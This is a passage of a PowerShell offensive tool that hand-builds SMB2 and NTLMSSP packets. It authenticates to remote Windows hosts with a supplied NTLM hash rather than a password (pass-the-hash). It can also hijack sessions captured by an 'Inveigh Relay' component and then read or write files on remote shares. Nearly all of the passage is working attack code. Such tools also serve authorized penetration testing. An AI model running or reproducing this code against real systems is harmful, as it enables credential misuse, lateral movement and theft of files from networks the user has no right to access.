    $packet_SMB2ReadRequest.Add("RemainingBytes",[Byte[]](0x00,0x00,0x00,0x00))
    $packet_SMB2ReadRequest.Add("ReadChannelInfoOffset",[Byte[]](0x00,0x00))
    $packet_SMB2ReadRequest.Add("ReadChannelInfoLength",[Byte[]](0x00,0x00))
    $packet_SMB2ReadRequest.Add("Buffer",[Byte[]](0x30))

    return $packet_SMB2ReadRequest
}

function New-PacketSMB2WriteRequest
{
    param ([Int]$packet_length,[Int64]$packet_offset,[Byte[]]$packet_file_ID,[Byte[]]$packet_buffer)

    [Byte[]]$packet_length_bytes = [System.BitConverter]::GetBytes($packet_length)
    [Byte[]]$packet_offset_bytes = [System.BitConverter]::GetBytes($packet_offset)

    $packet_SMB2WriteRequest = New-Object System.Collections.Specialized.OrderedDictionary
    $packet_SMB2WriteRequest.Add("StructureSize",[Byte[]](0x31,0x00))
    $packet_SMB2WriteRequest.Add("DataOffset",[Byte[]](0x70,0x00))
    $packet_SMB2WriteRequest.Add("Length",$packet_length_bytes)
    $packet_SMB2WriteRequest.Add("Offset",$packet_offset_bytes)
    $packet_SMB2WriteRequest.Add("FileID",$packet_file_ID)
    $packet_SMB2WriteRequest.Add("Channel",[Byte[]](0x00,0x00,0x00,0x00))
    $packet_SMB2WriteRequest.Add("RemainingBytes",[Byte[]](0x00,0x00,0x00,0x00))
    $packet_SMB2WriteRequest.Add("WriteChannelInfoOffset",[Byte[]](0x00,0x00))
    $packet_SMB2WriteRequest.Add("WriteChannelInfoLength",[Byte[]](0x00,0x00))
    $packet_SMB2WriteRequest.Add("Flags",[Byte[]](0x00,0x00,0x00,0x00))
    $packet_SMB2WriteRequest.Add("Buffer",$packet_buffer)

    return $packet_SMB2WriteRequest
}

function New-PacketSMB2CloseRequest
{
    param ([Byte[]]$packet_file_ID)

    $packet_SMB2CloseRequest = New-Object System.Collections.Specialized.OrderedDictionary
    $packet_SMB2CloseRequest.Add("StructureSize",[Byte[]](0x18,0x00))
    $packet_SMB2CloseRequest.Add("Flags",[Byte[]](0x00,0x00))
    $packet_SMB2CloseRequest.Add("Reserved",[Byte[]](0x00,0x00,0x00,0x00))
    $packet_SMB2CloseRequest.Add("FileID",$packet_file_ID)

    return $packet_SMB2CloseRequest
}

function New-PacketSMB2TreeDisconnectRequest
{
    $packet_SMB2TreeDisconnectRequest = New-Object System.Collections.Specialized.OrderedDictionary
    $packet_SMB2TreeDisconnectRequest.Add("StructureSize",[Byte[]](0x04,0x00))
    $packet_SMB2TreeDisconnectRequest.Add("Reserved",[Byte[]](0x00,0x00))

    return $packet_SMB2TreeDisconnectRequest
}

function New-PacketSMB2SessionLogoffRequest
{
    $packet_SMB2SessionLogoffRequest = New-Object System.Collections.Specialized.OrderedDictionary
    $packet_SMB2SessionLogoffRequest.Add("StructureSize",[Byte[]](0x04,0x00))
    $packet_SMB2SessionLogoffRequest.Add("Reserved",[Byte[]](0x00,0x00))

    return $packet_SMB2SessionLogoffRequest
}

#NTLM

function New-PacketNTLMSSPNegotiate
{
    param([Byte[]]$packet_negotiate_flags,[Byte[]]$packet_version)

    [Byte[]]$packet_NTLMSSP_length = [System.BitConverter]::GetBytes(32 + $packet_version.Length)
    $packet_NTLMSSP_length = $packet_NTLMSSP_length[0]
    [Byte[]]$packet_ASN_length_1 = $packet_NTLMSSP_length[0] + 32
    [Byte[]]$packet_ASN_length_2 = $packet_NTLMSSP_length[0] + 22
    [Byte[]]$packet_ASN_length_3 = $packet_NTLMSSP_length[0] + 20
    [Byte[]]$packet_ASN_length_4 = $packet_NTLMSSP_length[0] + 2

    $packet_NTLMSSPNegotiate = New-Object System.Collections.Specialized.OrderedDictionary
    $packet_NTLMSSPNegotiate.Add("InitialContextTokenID",[Byte[]](0x60))
    $packet_NTLMSSPNegotiate.Add("InitialcontextTokenLength",$packet_ASN_length_1)
    $packet_NTLMSSPNegotiate.Add("ThisMechID",[Byte[]](0x06))
    $packet_NTLMSSPNegotiate.Add("ThisMechLength",[Byte[]](0x06))
    $packet_NTLMSSPNegotiate.Add("OID",[Byte[]](0x2b,0x06,0x01,0x05,0x05,0x02))
    $packet_NTLMSSPNegotiate.Add("InnerContextTokenID",[Byte[]](0xa0))
    $packet_NTLMSSPNegotiate.Add("InnerContextTokenLength",$packet_ASN_length_2)
    $packet_NTLMSSPNegotiate.Add("InnerContextTokenID2",[Byte[]](0x30))
    $packet_NTLMSSPNegotiate.Add("InnerContextTokenLength2",$packet_ASN_length_3)
    $packet_NTLMSSPNegotiate.Add("MechTypesID",[Byte[]](0xa0))
    $packet_NTLMSSPNegotiate.Add("MechTypesLength",[Byte[]](0x0e))
    $packet_NTLMSSPNegotiate.Add("MechTypesID2",[Byte[]](0x30))
    $packet_NTLMSSPNegotiate.Add("MechTypesLength2",[Byte[]](0x0c))
    $packet_NTLMSSPNegotiate.Add("MechTypesID3",[Byte[]](0x06))
    $packet_NTLMSSPNegotiate.Add("MechTypesLength3",[Byte[]](0x0a))
    $packet_NTLMSSPNegotiate.Add("MechType",[Byte[]](0x2b,0x06,0x01,0x04,0x01,0x82,0x37,0x02,0x02,0x0a))
    $packet_NTLMSSPNegotiate.Add("MechTokenID",[Byte[]](0xa2))
    $packet_NTLMSSPNegotiate.Add("MechTokenLength",$packet_ASN_length_4)
    $packet_NTLMSSPNegotiate.Add("NTLMSSPID",[Byte[]](0x04))
    $packet_NTLMSSPNegotiate.Add("NTLMSSPLength",$packet_NTLMSSP_length)
    $packet_NTLMSSPNegotiate.Add("Identifier",[Byte[]](0x4e,0x54,0x4c,0x4d,0x53,0x53,0x50,0x00))
    $packet_NTLMSSPNegotiate.Add("MessageType",[Byte[]](0x01,0x00,0x00,0x00))
    $packet_NTLMSSPNegotiate.Add("NegotiateFlags",$packet_negotiate_flags)
    $packet_NTLMSSPNegotiate.Add("CallingWorkstationDomain",[Byte[]](0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00))
    $packet_NTLMSSPNegotiate.Add("CallingWorkstationName",[Byte[]](0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00))

    if($packet_version)
    {
        $packet_NTLMSSPNegotiate.Add("Version",$packet_version)
    }

    return $packet_NTLMSSPNegotiate
}

function New-PacketNTLMSSPAuth
{
    param([Byte[]]$packet_NTLM_response)

    [Byte[]]$packet_NTLMSSP_length = [System.BitConverter]::GetBytes($packet_NTLM_response.Length)
    $packet_NTLMSSP_length = $packet_NTLMSSP_length[1,0]
    [Byte[]]$packet_ASN_length_1 = [System.BitConverter]::GetBytes($packet_NTLM_response.Length + 12)
    $packet_ASN_length_1 = $packet_ASN_length_1[1,0]
    [Byte[]]$packet_ASN_length_2 = [System.BitConverter]::GetBytes($packet_NTLM_response.Length + 8)
    $packet_ASN_length_2 = $packet_ASN_length_2[1,0]
    [Byte[]]$packet_ASN_length_3 = [System.BitConverter]::GetBytes($packet_NTLM_response.Length + 4)
    $packet_ASN_length_3 = $packet_ASN_length_3[1,0]

    $packet_NTLMSSPAuth = New-Object System.Collections.Specialized.OrderedDictionary
    $packet_NTLMSSPAuth.Add("ASNID",[Byte[]](0xa1,0x82))
    $packet_NTLMSSPAuth.Add("ASNLength",$packet_ASN_length_1)
    $packet_NTLMSSPAuth.Add("ASNID2",[Byte[]](0x30,0x82))
    $packet_NTLMSSPAuth.Add("ASNLength2",$packet_ASN_length_2)
    $packet_NTLMSSPAuth.Add("ASNID3",[Byte[]](0xa2,0x82))
    $packet_NTLMSSPAuth.Add("ASNLength3",$packet_ASN_length_3)
    $packet_NTLMSSPAuth.Add("NTLMSSPID",[Byte[]](0x04,0x82))
    $packet_NTLMSSPAuth.Add("NTLMSSPLength",$packet_NTLMSSP_length)
    $packet_NTLMSSPAuth.Add("NTLMResponse",$packet_NTLM_response)

    return $packet_NTLMSSPAuth
}

function DataLength2
{
    param ([Int]$length_start,[Byte[]]$string_extract_data)

    $string_length = [System.BitConverter]::ToUInt16($string_extract_data[$length_start..($length_start + 1)],0)

    return $string_length
}

if($Modify -and $Action -eq 'Put' -and $Source -isnot [Byte[]])
{
    $output_message = "[-] Source must be a byte array when using -Modify"
    $startup_error = $true
}
elseif((!$Modify -and $Source -isnot [String]) -or ($Modify -and $Action -ne 'Put' -and $Source -isnot [String]))
{
    $output_message = "[-] Source must be a string"
    $startup_error = $true
}
elseif($Source -is [String])
{
    $source = $Source.Replace('.\','')
}

if($PSBoundParameters.ContainsKey('Session'))
{
    $inveigh_session = $true
}

if($PSBoundParameters.ContainsKey('Session'))
{

    if(!$Inveigh)
    {
        Write-Output "[-] Inveigh Relay session not found"
        $startup_error = $true
    }
    elseif(!$inveigh.session_socket_table[$session].Connected)
    {
        Write-Output "[-] Inveigh Relay session not connected"
        $startup_error = $true
    }

}

$destination = $Destination.Replace('.\','')

if($hash -like "*:*")
{
    $hash = $hash.SubString(($hash.IndexOf(":") + 1),32)
}

if($Domain)
{
    $output_username = $Domain + "\" + $Username
}
else
{
    $output_username = $Username
}

$process_ID = [System.Diagnostics.Process]::GetCurrentProcess() | Select-Object -expand id
$process_ID = [System.BitConverter]::ToString([System.BitConverter]::GetBytes($process_ID))
[Byte[]]$process_ID_bytes = $process_ID.Split("-") | ForEach-Object{[Char][System.Convert]::ToInt16($_,16)}

if(!$inveigh_session)
{
    $SMB_client = New-Object System.Net.Sockets.TCPClient
    $SMB_client.Client.ReceiveTimeout = 30000
}

$action_step = 0

if($Action -ne 'Put')
{
    $source = $source.Replace('\\','')
    $source_array = $source.Split('\')
    $target = $source_array[0]
    $share = $source_array[1]
    $source_subdirectory_array = $source.ToCharArray()
    [Array]::Reverse($source_subdirectory_array)
    $source_file = -join($source_subdirectory_array)
    $source_file = $source_file.SubString(0,$source_file.IndexOf('\'))
    $source_file_array = $source_file.ToCharArray()
    [Array]::Reverse($source_file_array)
    $source_file = -join($source_file_array)
    $target_share = "\\$target\$share"
}

switch($Action)
{

    'Get'
    {

        if(!$Modify)
        {

            if($destination -and $destination -like '*\*')
            {
                $destination_file_array = $destination.ToCharArray()
                [Array]::Reverse($destination_file_array)
                $destination_file = -join($destination_file_array)
                $destination_file = $destination_file.SubString(0,$destination_file.IndexOf('\'))
                $destination_file_array = $destination_file.ToCharArray()
                [Array]::Reverse($destination_file_array)
                $destination_file = -join($destination_file_array)
                $destination_path = $destination
            }
            elseif($destination)
            {

                if(Test-Path (Join-Path $PWD $destination))
                {
                    $output_message = "[-] Destination file already exists"
                    $startup_error = $true
                }
                else
                {
                    $destination_path = Join-Path $PWD $destination
                }
               
            }
            else
            {

                if(Test-Path (Join-Path $PWD $source_file))
                {
                    $output_message = "[-] Destination file already exists"
                    $startup_error = $true
                }
                else
                {
                    $destination_path = Join-Path $PWD $source_file
                }

            }

        }
        else
        {
            $file_memory = New-Object System.Collections.ArrayList
        }

    }

    'Put'
    {

        if(!$Modify)
        {

            if($source -notlike '*\*')
            {
                $source = Join-Path $PWD $source
            }

            if(Test-Path $source)
            {
                [Int64]$source_file_size = (Get-Item $source).Length
                $source_file = $source

                if($source_file_size -gt 65536)
                {
                    $source_file_size_quotient = [Math]::Truncate($source_file_size / 65536)
                    $source_file_size_remainder = $source_file_size % 65536
                    $source_file_buffer_size = 65536
                }
                else
                {
                    $source_file_buffer_size = $source_file_size
                }

                $source_file_properties = Get-ItemProperty -path $source_file
                $source_file_creation_time = $source_file_properties.CreationTime.ToFileTime()
                $source_file_creation_time = [System.BitConverter]::ToString([System.BitConverter]::GetBytes($source_file_creation_time))
                $source_file_creation_time = $source_file_creation_time.Split("-") | ForEach-Object{[Char][System.Convert]::ToInt16($_,16)}
                $source_file_last_access_time = $source_file_properties.LastAccessTime.ToFileTime()
                $source_file_last_access_time = [System.BitConverter]::ToString([System.BitConverter]::GetBytes($source_file_last_access_time))
                $source_file_last_access_time = $source_file_last_access_time.Split("-") | ForEach-Object{[Char][System.Convert]::ToInt16($_,16)}
                $source_file_last_write_time = $source_file_properties.LastWriteTime.ToFileTime()
                $source_file_last_write_time = [System.BitConverter]::ToString([System.BitConverter]::GetBytes($source_file_last_write_time))
                $source_file_last_write_time = $source_file_last_write_time.Split("-") | ForEach-Object{[Char][System.Convert]::ToInt16($_,16)}
                $source_file_last_change_time = $source_file_last_write_time
                $source_file_buffer = new-object byte[] $source_file_buffer_size
                $source_file_stream = new-object IO.FileStream($source_file,[System.IO.FileMode]::Open)
                $source_file_binary_reader = new-object IO.BinaryReader($source_file_stream)
            }
            else
            {
                $output_message = "[-] File not found"
                $startup_error = $true
            }

        }
        else
        {

            [Int64]$source_file_size = $Source.Count

            if($source_file_size -gt 65536)
            {
                $source_file_size_quotient = [Math]::Truncate($source_file_size / 65536)
                $source_file_size_remainder = $source_file_size % 65536
                $source_file_buffer_size = 65536
            }
            else
            {
                $source_file_buffer_size = $source_file_size
            }
      
        }

        $destination = $destination.Replace('\\','')
        $destination_array = $destination.Split('\')
        $target = $destination_array[0]
        $share = $destination_array[1]
        $destination_file_array = $destination.ToCharArray()
        [Array]::Reverse($destination_file_array)
        $destination_file = -join($destination_file_array)
        $destination_file = $destination_file.SubString(0,$destination_file.IndexOf('\'))
        $destination_file_array = $destination_file.ToCharArray()
        [Array]::Reverse($destination_file_array)
        $destination_file = -join($destination_file_array)
    }

}

if($Action -ne 'Put')
{

    if($source_array.Count -gt 2)
    {
        $share_subdirectory = $source.Substring($target.Length + $share.Length + 2)
    }

}
else
{
    
    if($destination_array.Count -gt 2)
    {
        $share_subdirectory = $destination.Substring($target.Length + $share.Length + 2)
    }

}

if($share_subdirectory -and $share_subdirectory.EndsWith('\'))
{
    $share_subdirectory = $share_subdirectory.Substring(0,$share_subdirectory.Length - 1)
}

if(!$startup_error -and !$inveigh_session)
{

    try
    {
        $SMB_client.Connect($target,"445")
    }
    catch
    {
        $output_message = "[-] $target did not respond"
    }

}

if($SMB_client.Connected -or (!$startup_error -and $inveigh.session_socket_table[$session].Connected))
{
    
    $SMB_client_receive = New-Object System.Byte[] 81920

    if(!$inveigh_session)
    {
        $SMB_client_stream = $SMB_client.GetStream()
        $SMB_client_stage = 'NegotiateSMB'

        while($SMB_client_stage -ne 'exit')
        {
            
            switch($SMB_client_stage)
            {

                'NegotiateSMB'
                {          
                    $packet_SMB_header = New-PacketSMBHeader 0x72 0x18 0x01,0x48 0xff,0xff $process_ID_bytes 0x00,0x00       
                    $packet_SMB_data = New-PacketSMBNegotiateProtocolRequest $SMB_version
                    $SMB_header = ConvertFrom-PacketOrderedDictionary $packet_SMB_header
                    $SMB_data = ConvertFrom-PacketOrderedDictionary $packet_SMB_data
                    $packet_NetBIOS_session_service = New-PacketNetBIOSSessionService $SMB_header.Length $SMB_data.Length
                    $NetBIOS_session_service = ConvertFrom-PacketOrderedDictionary $packet_NetBIOS_session_service
                    $SMB_client_send = $NetBIOS_session_service + $SMB_header + $SMB_data
                    $SMB_client_stream.Write($SMB_client_send,0,$SMB_client_send.Length) > $null
                    $SMB_client_stream.Flush()    
                    $SMB_client_stream.Read($SMB_client_receive,0,$SMB_client_receive.Length) > $null

                    if([System.BitConverter]::ToString($SMB_client_receive[4..7]) -eq 'ff-53-4d-42')
                    {
                        $SMB_client_stage = 'exit'
                        $login_successful = $false
                        $output_message = "[-] SMB1 is not supported"
                    }
                    else
                    {
                        $SMB_version = 'SMB2'
                        $SMB_client_stage = 'NegotiateSMB2'

                        if([System.BitConverter]::ToString($SMB_client_receive[70]) -eq '03')
                        {
                            Write-Verbose "[!] SMB signing is enabled"
                            $SMB_signing = $true
                            $SMB_session_key_length = 0x00,0x00
                            $SMB_negotiate_flags = 0x15,0x82,0x08,0xa0
                        }
                        else
                        {
                            $SMB_signing = $false
                            $SMB_session_key_length = 0x00,0x00
                            $SMB_negotiate_flags = 0x05,0x80,0x08,0xa0
                        }

                    }

                }

                'NegotiateSMB2'
                {
                    $SMB2_tree_ID = 0x00,0x00,0x00,0x00
                    $SMB_session_ID = 0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00
                    $SMB2_message_ID = 1
                    $packet_SMB2_header = New-PacketSMB2Header 0x00,0x00 0x00,0x00 $SMB2_message_ID $process_ID_bytes $SMB2_tree_ID $SMB_session_ID
                    $packet_SMB2_data = New-PacketSMB2NegotiateProtocolRequest
                    $SMB2_header = ConvertFrom-PacketOrderedDictionary $packet_SMB2_header
                    $SMB2_data = ConvertFrom-PacketOrderedDictionary $packet_SMB2_data
                    $packet_NetBIOS_session_service = New-PacketNetBIOSSessionService $SMB2_header.Length $SMB2_data.Length
                    $NetBIOS_session_service = ConvertFrom-PacketOrderedDictionary $packet_NetBIOS_session_service
                    $SMB_client_send = $NetBIOS_session_service + $SMB2_header + $SMB2_data
                    $SMB_client_stream.Write($SMB_client_send,0,$SMB_client_send.Length) > $null
                    $SMB_client_stream.Flush()    
                    $SMB_client_stream.Read($SMB_client_receive,0,$SMB_client_receive.Length) > $null
                    $SMB_client_stage = 'NTLMSSPNegotiate'
                }
                    
                'NTLMSSPNegotiate'
                { 
                    $SMB2_message_ID++
                    $packet_SMB2_header = New-PacketSMB2Header 0x01,0x00 0x00,0x00 $SMB2_message_ID $process_ID_bytes $SMB2_tree_ID $SMB_session_ID
                    $packet_NTLMSSP_negotiate = New-PacketNTLMSSPNegotiate $SMB_negotiate_flags
                    $SMB2_header = ConvertFrom-PacketOrderedDictionary $packet_SMB2_header
                    $NTLMSSP_negotiate = ConvertFrom-PacketOrderedDictionary $packet_NTLMSSP_negotiate       
                    $packet_SMB2_data = New-PacketSMB2SessionSetupRequest $NTLMSSP_negotiate
                    $SMB2_data = ConvertFrom-PacketOrderedDictionary $packet_SMB2_data
                    $packet_NetBIOS_session_service = New-PacketNetBIOSSessionService $SMB2_header.Length $SMB2_data.Length
                    $NetBIOS_session_service = ConvertFrom-PacketOrderedDictionary $packet_NetBIOS_session_service
                    $SMB_client_send = $NetBIOS_session_service + $SMB2_header + $SMB2_data
                    $SMB_client_stream.Write($SMB_client_send,0,$SMB_client_send.Length) > $null
                    $SMB_client_stream.Flush()    
                    $SMB_client_stream.Read($SMB_client_receive,0,$SMB_client_receive.Length) > $null
                    $SMB_client_stage = 'exit'
                }
                
            }

        }

        if($SMB_version -eq 'SMB2')
        {
            $SMB_NTLMSSP = [System.BitConverter]::ToString($SMB_client_receive)
            $SMB_NTLMSSP = $SMB_NTLMSSP -replace "-",""
            $SMB_NTLMSSP_index = $SMB_NTLMSSP.IndexOf("4E544C4D53535000")
            $SMB_NTLMSSP_bytes_index = $SMB_NTLMSSP_index / 2
            $SMB_domain_length = DataLength2 ($SMB_NTLMSSP_bytes_index + 12) $SMB_client_receive
            $SMB_target_length = DataLength2 ($SMB_NTLMSSP_bytes_index + 40) $SMB_client_receive
            $SMB_session_ID = $SMB_client_receive[44..51]
            $SMB_NTLM_challenge = $SMB_client_receive[($SMB_NTLMSSP_bytes_index + 24)..($SMB_NTLMSSP_bytes_index + 31)]
            $SMB_target_details = $SMB_client_receive[($SMB_NTLMSSP_bytes_index + 56 + $SMB_domain_length)..($SMB_NTLMSSP_bytes_index + 55 + $SMB_domain_length + $SMB_target_length)]
            $SMB_target_time_bytes = $SMB_target_details[($SMB_target_details.Length - 12)..($SMB_target_details.Length - 5)]
            $NTLM_hash_bytes = (&{for ($i = 0;$i -lt $hash.Length;$i += 2){$hash.SubString($i,2)}}) -join "-"
            $NTLM_hash_bytes = $NTLM_hash_bytes.Split("-") | ForEach-Object{[Char][System.Convert]::ToInt16($_,16)}
            $auth_hostname = (Get-ChildItem -path env:computername).Value
            $auth_hostname_bytes = [System.Text.Encoding]::Unicode.GetBytes($auth_hostname)
            $auth_domain_bytes = [System.Text.Encoding]::Unicode.GetBytes($Domain)
            $auth_username_bytes = [System.Text.Encoding]::Unicode.GetBytes($username)
            $auth_domain_length = [System.BitConverter]::GetBytes($auth_domain_bytes.Length)
            $auth_domain_length = $auth_domain_length[0,1]
            $auth_domain_length = [System.BitConverter]::GetBytes($auth_domain_bytes.Length)
            $auth_domain_length = $auth_domain_length[0,1]
            $auth_username_length = [System.BitConverter]::GetBytes($auth_username_bytes.Length)
            $auth_username_length = $auth_username_length[0,1]
            $auth_hostname_length = [System.BitConverter]::GetBytes($auth_hostname_bytes.Length)
            $auth_hostname_length = $auth_hostname_length[0,1]
            $auth_domain_offset = 0x40,0x00,0x00,0x00
            $auth_username_offset = [System.BitConverter]::GetBytes($auth_domain_bytes.Length + 64)
            $auth_hostname_offset = [System.BitConverter]::GetBytes($auth_domain_bytes.Length + $auth_username_bytes.Length + 64)
            $auth_LM_offset = [System.BitConverter]::GetBytes($auth_domain_bytes.Length + $auth_username_bytes.Length + $auth_hostname_bytes.Length + 64)
            $auth_NTLM_offset = [System.BitConverter]::GetBytes($auth_domain_bytes.Length + $auth_username_bytes.Length + $auth_hostname_bytes.Length + 88)
            $HMAC_MD5 = New-Object System.Security.Cryptography.HMACMD5
            $HMAC_MD5.key = $NTLM_hash_bytes
            $username_and_target = $username.ToUpper()
            $username_and_target_bytes = [System.Text.Encoding]::Unicode.GetBytes($username_and_target)
            $username_and_target_bytes += $auth_domain_bytes
            $NTLMv2_hash = $HMAC_MD5.ComputeHash($username_and_target_bytes)
            $client_challenge = [String](1..8 | ForEach-Object {"{0:X2}" -f (Get-Random -Minimum 1 -Maximum 255)})
            $client_challenge_bytes = $client_challenge.Split(" ") | ForEach-Object{[Char][System.Convert]::ToInt16($_,16)}

            $security_blob_bytes = 0x01,0x01,0x00,0x00,
                                    0x00,0x00,0x00,0x00 +
                                    $SMB_target_time_bytes +
                                    $client_challenge_bytes +
                                    0x00,0x00,0x00,0x00 +
                                    $SMB_target_details +
                                    0x00,0x00,0x00,0x00,
                                    0x00,0x00,0x00,0x00

            $server_challenge_and_security_blob_bytes = $SMB_NTLM_challenge + $security_blob_bytes
            $HMAC_MD5.key = $NTLMv2_hash
            $NTLMv2_response = $HMAC_MD5.ComputeHash($server_challenge_and_security_blob_bytes)

            if($SMB_signing)
            {
                $session_base_key = $HMAC_MD5.ComputeHash($NTLMv2_response)
                $session_key = $session_base_key
                $HMAC_SHA256 = New-Object System.Security.Cryptography.HMACSHA256
                $HMAC_SHA256.key = $session_key
            }

            $NTLMv2_response = $NTLMv2_response + $security_blob_bytes
            $NTLMv2_response_length = [System.BitConverter]::GetBytes($NTLMv2_response.Length)
            $NTLMv2_response_length = $NTLMv2_response_length[0,1]
            $SMB_session_key_offset = [System.BitConverter]::GetBytes($auth_domain_bytes.Length + $auth_username_bytes.Length + $auth_hostname_bytes.Length + $NTLMv2_response.Length + 88)

            $NTLMSSP_response = 0x4e,0x54,0x4c,0x4d,0x53,0x53,0x50,0x00,
                                    0x03,0x00,0x00,0x00,
                                    0x18,0x00,
                                    0x18,0x00 +
                                    $auth_LM_offset +
                                    $NTLMv2_response_length +
                                    $NTLMv2_response_length +
                                    $auth_NTLM_offset +
                                    $auth_domain_length +
                                    $auth_domain_length +
                                    $auth_domain_offset +
                                    $auth_username_length +
                                    $auth_username_length +
                                    $auth_username_offset +
                                    $auth_hostname_length +
                                    $auth_hostname_length +
                                    $auth_hostname_offset +
                                    $SMB_session_key_length +
                                    $SMB_session_key_length +
                                    $SMB_session_key_offset +
                                    $SMB_negotiate_flags +
                                    $auth_domain_bytes +
                                    $auth_username_bytes +
                                    $auth_hostname_bytes +
                                    0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,
                                    0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00 +
                                    $NTLMv2_response

            $SMB2_message_ID++
            $packet_SMB2_header = New-PacketSMB2Header 0x01,0x00 0x00,0x00 $SMB2_message_ID $process_ID_bytes $SMB2_tree_ID $SMB_session_ID
            $packet_NTLMSSP_auth = New-PacketNTLMSSPAuth $NTLMSSP_response
            $SMB2_header = ConvertFrom-PacketOrderedDictionary $packet_SMB2_header
            $NTLMSSP_auth = ConvertFrom-PacketOrderedDictionary $packet_NTLMSSP_auth        
            $packet_SMB2_data = New-PacketSMB2SessionSetupRequest $NTLMSSP_auth
            $SMB2_data = ConvertFrom-PacketOrderedDictionary $packet_SMB2_data
            $packet_NetBIOS_session_service = New-PacketNetBIOSSessionService $SMB2_header.Length $SMB2_data.Length
            $NetBIOS_session_service = ConvertFrom-PacketOrderedDictionary $packet_NetBIOS_session_service
            $SMB_client_send = $NetBIOS_session_service + $SMB2_header + $SMB2_data
            $SMB_client_stream.Write($SMB_client_send,0,$SMB_client_send.Length) > $null
            $SMB_client_stream.Flush()
            $SMB_client_stream.Read($SMB_client_receive,0,$SMB_client_receive.Length) > $null
        
            if([System.BitConverter]::ToString($SMB_client_receive[12..15]) -eq '00-00-00-00')
            {
                Write-Verbose "[+] $output_username successfully authenticated on $target"
                $login_successful = $true
            }
            else
            {
                $output_message = "[-] $output_username failed to authenticate on $target"
                $login_successful = $false
            }

        }

    }

    try
    {

    if($login_successful -or $inveigh_session)
    {

        if($inveigh_session)
        {

            if($inveigh_session -and $inveigh.session_lock_table[$session] -eq 'locked')
            {
                Write-Output "[*] Pausing due to Inveigh Relay session lock"
                Start-Sleep -s 2
            }

            $inveigh.session_lock_table[$session] = 'locked'
            $SMB_client = $inveigh.session_socket_table[$session]
            $SMB_client_stream = $SMB_client.GetStream()
            $SMB_session_ID = $inveigh.session_table[$session]
            $SMB2_message_ID =  $inveigh.session_message_ID_table[$session]
            $SMB2_tree_ID = 0x00,0x00,0x00,0x00
        }

        $SMB_path = "\\" + $Target + "\IPC$"
        $SMB_path_bytes = [System.Text.Encoding]::Unicode.GetBytes($SMB_path)
        $directory_list = New-Object System.Collections.ArrayList
        $SMB_client_stage = 'TreeConnect'

        :SMB_execute_loop while ($SMB_client_stage -ne 'exit')
        {

            switch($SMB_client_stage)
            {
        
                'TreeConnect'
                {
                    $SMB2_message_ID++
                    $packet_SMB2_header = New-PacketSMB2Header 0x03,0x00 0x1f,0x00 $SMB2_message_ID $process_ID_bytes $SMB2_tree_ID $SMB_session_ID

                    if($SMB_signing)
                    {
                        $packet_SMB2_header["Flags"] = 0x08,0x00,0x00,0x00      
                    }

                    $packet_SMB2_data = New-PacketSMB2TreeConnectRequest $SMB_path_bytes
                    $SMB2_header = ConvertFrom-PacketOrderedDictionary $packet_SMB2_header
                    $SMB2_data = ConvertFrom-PacketOrderedDictionary $packet_SMB2_data    
                    $packet_NetBIOS_session_service = New-PacketNetBIOSSessionService $SMB2_header.Length $SMB2_data.Length
                    $NetBIOS_session_service = ConvertFrom-PacketOrderedDictionary $packet_NetBIOS_session_service

                    if($SMB_signing)
                    {
                        $SMB2_sign = $SMB2_header + $SMB2_data 
                        $SMB2_signature = $HMAC_SHA256.ComputeHash($SMB2_sign)
                        $SMB2_signature = $SMB2_signature[0..15]
                        $packet_SMB2_header["Signature"] = $SMB2_signature
                        $SMB2_header = ConvertFrom-PacketOrderedDictionary $packet_SMB2_header
                    }

                    $SMB_client_send = $NetBIOS_session_service + $SMB2_header + $SMB2_data

                    try
                    {
                        $SMB_client_stream.Write($SMB_client_send,0,$SMB_client_send.Length) > $null
                        $SMB_client_stream.Flush()
                        $SMB_client_stream.Read($SMB_client_receive,0,$SMB_client_receive.Length) > $null
                    }
                    catch
                    {
                        Write-Output "[-] Session connection is closed"
                        $SMB_client_stage = 'Exit'
                    }
                    
                    if($SMB_client_stage -ne 'Exit')
                    {

                        if([System.BitConverter]::ToString($SMB_client_receive[12..15]) -ne '00-00-00-00')
                        {
                            $error_code = [System.BitConverter]::ToString($SMB_client_receive[12..15])

                            switch($error_code)
                            {

                                'cc-00-00-c0'
                                {
                                    $output_message = "[-] Share not found"
                                    $SMB_client_stage = 'Exit'
                                }

                                '22-00-00-c0'
                                {
                                    $output_message = "[-] Access denied"
                                    $SMB_client_stage = 'Exit'
                                }

                                default
                                {
                                    $error_code = $error_code -replace "-",""
                                    $output_message = "[-] Tree connect error code 0x$error_code"
                                    $SMB_client_stage = 'Exit'
                                }

                            }

                        }
                        elseif($refresh)
                        {
                            Write-Output "[+] Session refreshed"
                            $SMB_client_stage = 'Exit'
                        }
                        elseif(!$SMB_IPC)
                        {
                            $SMB_share_path = "\\" + $Target + "\" + $Share
                            $SMB_path_bytes = [System.Text.Encoding]::Unicode.GetBytes($SMB_share_path)
                            $SMB_IPC = $true
                            $SMB_client_stage = 'IoctlRequest'
                        }
                        else
                        {

                            if($Action -eq 'Put')
                            {
                                $SMB2_file = [System.Text.Encoding]::Unicode.GetBytes($share_subdirectory)
                                $create_request_extra_info = 2
                            }
                            else
                            {
                                $create_request_extra_info = 1
                            }

                            $SMB2_tree_ID = $SMB_client_receive[40..43]
                            $SMB_client_stage = 'CreateRequest'

                            if($Action -eq 'Get')
                            {
                                $SMB2_file = [System.Text.Encoding]::Unicode.GetBytes($share_subdirectory)
                            }

                        }

                    }

                }

                'IoctlRequest'
                {
                    $SMB2_tree_ID = 0x01,0x00,0x00,0x00
                    $SMB_ioctl_path = "\" + $Target + "\" + $Share
                    $SMB_ioctl_path_bytes = [System.Text.Encoding]::Unicode.GetBytes($SMB_ioctl_path) + 0x00,0x00
                    $SMB2_message_ID++
                    $packet_SMB2_header = New-PacketSMB2Header 0x0b,0x00 0x01,0x00 $SMB2_message_ID $process_ID_bytes $SMB2_tree_ID $SMB_session_ID

                    if($SMB_signing)
                    {
                        $packet_SMB2_header["Flags"] = 0x08,0x00,0x00,0x00      
                    }

                    $packet_SMB2_data = New-PacketSMB2IoctlRequest $SMB_ioctl_path_bytes
                    $SMB2_header = ConvertFrom-PacketOrderedDictionary $packet_SMB2_header
                    $SMB2_data = ConvertFrom-PacketOrderedDictionary $packet_SMB2_data    
                    $packet_NetBIOS_session_service = New-PacketNetBIOSSessionService $SMB2_header.Length $SMB2_data.Length
